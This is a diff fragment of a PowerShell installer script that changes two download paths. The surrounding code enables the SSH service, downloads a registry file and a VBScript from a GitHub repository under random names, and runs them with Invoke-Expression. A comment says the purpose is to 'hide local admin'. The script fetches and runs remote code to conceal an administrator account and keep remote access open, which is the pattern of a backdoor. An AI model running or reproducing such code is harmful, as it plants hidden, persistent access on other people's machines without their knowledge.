@@ -62,11 +62,11 @@ Set-Service -Name sshd -StartupType 'Automatic'
 
 # registry to hide local admin
 $reg_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/files/Registry.reg -OutFile "$reg_file.reg"
 
 # visual basic script to register the registry
 $con_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "$con_file.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/files/confirm.vbs -OutFile "$con_file.vbs"
 
 # install the registry
 Invoke-Expression "./$reg_file.reg"; Invoke-Expression "./$con_file.vbs"
